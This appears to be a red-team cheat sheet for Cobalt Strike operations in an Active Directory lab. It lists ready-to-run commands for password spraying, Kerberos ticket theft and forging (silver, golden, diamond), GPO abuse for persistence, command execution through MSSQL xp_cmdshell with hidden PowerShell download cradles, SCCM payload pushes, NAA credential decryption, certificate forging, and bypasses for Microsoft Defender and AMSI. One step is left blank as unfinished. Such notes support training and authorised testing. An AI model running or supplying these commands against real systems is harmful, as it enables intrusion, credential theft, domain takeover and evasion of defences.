### Starting the TeamServer
```
sudo ./teamserver <host-ip> <password> <c2-profile-path>
```

### Running TeamServer as Systemd service
`/etc/systemd/system/teamserver.service`
```
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=<cobaltstrike-dir>
ExecStart=<teamserver-path> <host-ip> <password> <c2-profile-path>

[Install]
WantedBy=multi-user.target
```

---
## Initial Compromise
### MailSniper Password Spraying
#### Importing
`ipmo C:\Tools\MailSniper\MailSniper.ps1`

#### Enumerating NetBIOS name for domain
`Invoke-DomainHarvestOWA -ExchHostname <mailserver-hostname>`

#### Enumerating valid email users
`Invoke-UsernameHarvestOWA -ExchHostname <mailserver-hostname> -Domain <domain> -UserList <possible-names-path> -OutFile <outfile>`

---
## Kerberos
### Unconstrained Delegation
#### Enumerating TGTs on system
```
beacon> execute-assembly <C:\Rubeus\path> triage
```
#### Creating process with TGT
```
beacon> execute-assembly <C:\Rubeus\path> createnetonly /program:C:\Windows\System32\cmd.exe /domain:<domain> /username:<user> /password:FakePass /ticket:<tgt>
```

**User can then be impersonated with:**
`beacon> steal_token <pid>`

**Practical command**
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:<tgt>
```

---
### Group Policy Objects
#### Enumerating GPOs with exploitable properties
**Requires importing Powerview**
```
beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
```

#### Resolving GPO Display name
```
beacon> powershell Get-DomainGPO -Identity <ObjectDN> | select displayName, gpcFileSysPath
```

#### Resolving Domain Group that GPO can be modified by
```
beacon> powershell ConvertFrom-SID <SID>
```

#### Enumerating which OUs a GPO applies to
```
beacon> powershell Get-DomainOU -GPLink "<GPO-GUID>" | select distinguishedName
```

### Enumerate computers in an OU
```
beacon> powershell Get-DomainComputer -SearchBase "<OU-distinguishedname>" | select dnsHostName
```

### Adding Computer Startup Script to GPO
**Using SharpGPOAbuse**
```
beacon> execute-assembly <C:\SharpGPOAbuse\Path> --AddComputerScript --ScriptName <script-name> --ScriptContents "start /b <program-path>" --GPOName "<vuln-gpo-name>"
```

### Creating new GPOs
#### 1. Enumerate groups that can create new GPOs
```
beacon> powershell Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
```

#### 2. Enumaerate groups that can link GPOs to OUs
```
beacon> powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl
```

```
beacon> powershell ConvertFrom-SID <sid>
```

#### Check if GPOs can be created from Powershell
**Using Powershell RSAT modules**
```
beacon> powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
```

#### Create and link new GPO
```
beacon> powershell New-GPO -Name "<gpo-name>"
```

#### Creating an HKLM AutoRun key on the GPO'
```
beacon> powershell Set-GPPrefRegistryValue -Name "<gpo-name>" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "<value-name>" -Value "C:\Windows\System32\cmd.exe /c <payload-path>" -Type ExpandString
```

#### Applying a GPO to a target OU
```
beacon> powershell Get-GPO -Name "<gpo-name>" | New-GPLink -Target "<ou-string>"
```

---
## MS-SQL Servers
#### Tools
- PowerUpSQL
- SQLRecon

#### Enumerate MSSQL instances on domain
```
beacon> powershell Get-SQLInstanceDomain
```

#### Testing connection to SQL server
```
beacon> powershell Get-SQLConnectionTest -Instance "<hostname>,<port>" | fl
```

#### Get information about MSSQL server instance
```
beacon> powershell Get-SQLServerInfo -Instance "<hostname>,<port>"
```

#### Enumerating all accessible SQL server instances
```
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```

#### Enumerating SQL Server instances using SQLRecon
```
# Enumerate SPNs
beacon> execute-assembly <C:\SQLRecon\Path> /enum:sqlspns

# Get information about instance
beacon> execute-assembly <C:\SQLRecon\Path> /auth:wintoken /host:<hostname> /module:info
```

#### Enumerate accessible roles
**Uses the beacon's token**
```
beacon> execute-assembly <C:\SQLRecon\Path> /a:wintoken /h:<hostname>,<port> /m:whoami
```

#### Find groups with users that might have SQL access
```
beacon> powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
```

#### Enumerating the MSSQL service account
**Possible if the service account is kerberoastable and the password able to be cracked.**

```
beacon> execute-assembly <C:\SQLRecon\Path> /a:windomain /d:<domain> /u:<sql-svc-acc> /p:<password> /h:<hostname>,<port> /m:whoami
```

#### Accessing SQL Server with PTH
**SOCKS proxy to the network is required**.
```
proxychains mssqlclient.py <dom\user>@<ip> -hashes :<ntlm-hash> -windows-auth
```

#### Executing shell commands on MSSQL Server
**Using PowerUpSQL**
```
beacon> powershell Invoke-SQLOSCmd -Instance "<hostname>,<port>" -Command "<cmd>" -RawResults
```

#### Deploying beacon on MSSQL Server
1. Set up reverse port forward on host that can reach the TeamServer 
```
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

beacon> rportfwd 8080 127.0.0.1 80
```

2. 
```

```
**To be completed**

#### Finding linked MSSQL Servers
**Using PowerUpSQL**
```
beacon> powershell Get-SQLServerLinkCrawl -Instance "<hostname>,<port>"
```

#### Checking status of xp_cmdshell on link
```
beacon> execute-assembly <C:\SQLRecon\Path> /a:wintoken /h:<hostname>,<port> /m:lquery /l:<linked-hostname> /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"
```

#### Enable xp_cmdshell on link
**Only works if RPC Out is enabled on the linked MSSQL Server.**
```SQL
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [<link-hostname>]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [<link-hostname>]
```

#### Getting a beacon on the linked MSSQL Server
**Make sure to encode the text to UTF-16LE before encoding to B64.**
```
# 1. Set up a reverse port forward on the original SQL host
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

beacon> rportfwd 8080 127.0.0.1 80

# 2. Execute download cradle on the linked server, in eg. impacket-mssqlclient
EXEC('xp_cmdshell ''powershell -w hidden -enc <b64-download-cradle>''') AT [<link-hostname>]
```

#### MSSQL Account Privilege Escalation
**Using SweetPotato**
```
execute-assembly <C:\SweetPotato\Path> -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc <utf16le-b64-download-cradle>"
```
**If the download cradle executes an SMB beacon, don't forget to link it back to the unprivileged beacon**

---
## MS Configuration Manager (SCCM)
#### Enumerating site-info
**Using SharpSCCM
Authenticated user needs to have the 'Full Administrator' SCCM role to be able to view the whole site**
```
beacon> execute-assembly <C:\SharpSCCM\Path> local site-info --no-banner
```

#### Enumerating collections
```
beacon> execute-assembly <C:\SharpSCCM\Path> get collections --no-banner
```

#### Enumerating administrative users
```
beacon> execute-assembly <C:\SharpSCCM\Path> get class-instances SMS_Admin --no-banner
```

#### Enumerate collection members 
```
beacon> execute-assembly <C:\SharpSCCM\Path> get collection-members -n <domain> --no-banner
```

#### Enumerate device information
```
beacon> execute-assembly <C:\SharpSCCM\Path> get devices -n <search-query> -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner
```

#### Finding and Decrypting Network Access Account (NAA) creds
```
execute-assembly <C:\SharpSCCM\Path> local naa -m wmi --no-banner
```

**The following can be run with local admin privileges**
```
execute-assembly <C:\SharpSCCM\Path> get naa -m wmi --no-banner
```

#### Executing a payload on all devices in a collection
```
beacon> execute-assembly <C:\SharpSCCM\Path> exec -n <domain> -p "C:\Windows\System32\cmd.exe /c start /b <payload-path>" -s --no-banner
```

---

## Domain Dominance
#### Forging a Silver Ticket
Gives access to a service on a system. `krb-aes-key` is the AES256 key of the machine to get access to.

```
PS> <C:\Rubeus\Path> silver /service:<service>/<hostname> /aes256:<krb-aes-key> /user:<user> /domain:<domain> /sid:<user-sid> /nowrap
```

#### Useful ticket combinations

| **Technique**     | **Required Service Tickets** |
| ----------------- | ---------------------------- |
| psexec            | HOST & CIFS                  |
| winrm             | HOST & HTTP                  |
| dcsync (DCs only) | LDAP                         |
#### Forging a Golden Ticket
Gives access to any user or service on the whole domain, basically forever.
```
PS> <C:\Rubeus\Path> golden /aes256:<dc-krbtgt-aes256> /user:<user> /domain:<fq-dn> /sid:<user-sid> /nowrap
```

#### Forging a Diamond Ticket
A modified TGT issued by a DC that gives golden ticket access to the domain.
```
beacon> execute-assembly <C:\Rubeus\Path> diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<user-dom-rid> /groups:<user-dom-group-rid> /krbkey:<krbtgt-aes356> /nowrap
```

#### Forging a Certificate
1. Extract CA DPAPI private key with SharpDPAPI. Save the private key to a .pem file and convert it with openssl to .pfx.
```
beacon> execute-assembly <SharpDPAPI\Path> certificates /machine
```

2. Forge the certificate using ForgeCert.
```
PS> <C:\ForgeCert\Path> --CaCertPath <cert-path> --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "<user>@<fq-dn>" --NewCertPath <new-cert-path> --NewCertPassword pass123
```

3. Request a legitimate TGT with the forged cert.
```
beacon> execute-assembly <C:\Rubeus\Path> asktgt /user:<user> /domain:<fq-dn> /enctype:aes256 /certificate:<cert> /password:pass123 /nowrap
```

---

## Microsoft Defender
#### Bypassing artifact detection
1. Build the artifacts in Cobalt Strike's Artifact Kit
```
./build.sh pipe VirtualAlloc 310272 5 false false none </cobaltstrike-path/artifacts>
```

2. Check for detection using ThreatCheck on an artifact. Disable real-time protection before running.
```
PS> <C:\ThreatCheck\Path> -f <artifact-path>
```

3. If threat is found, search memory in Ghidra, find where detection is happening, and modify the source code. Recompile artifacts using the Artifact Kit and iterate.
4. When all detections are gone, import the artifact aggressor script into cobalt strike and regenerate all stageless windows payload. Delete all old payloads beforehand.

#### Bypassing script detection
1. Run ThreatCheck on a script to check if it gets detected. Be sure to enable real-time protection in MS Defender before running the check.
```
PS> <C:\ThreatCheck\Path> -f <payload-script-path> -e amsi
```

2. Modify the script or the template (template.arch.ps1) in Cobalt Strike's Resource Kit, rebuild payloads, and iterate until no detections happen.

3. Don't use Scripted Delivery Payloads. Instead, host the undetected scripts manually in CS.

#### Malleable C2 AMSI Bypass
AMSI can be disabled when running powerpick, execute-assembly and psinject, by modifying the malleable c2 profile, by inserting the following right above the http-get block:
```
post-ex {
        set amsi_disable "true";
}
```

Thereafter, check the c2 profile with c2lint.

```
wsl cobaltstrike-path> ./c2lint c2-profiles/normal/webbug.profile
```

Recommended C2 profile: https://github.com/RedefiningReality/Cobalt-Strike/blob/main/profile/crtl.profile
#### Manual AMSI bypass
Host the AMSI-Bypass script (in this directory) on the TeamServer and execute it before running anything else.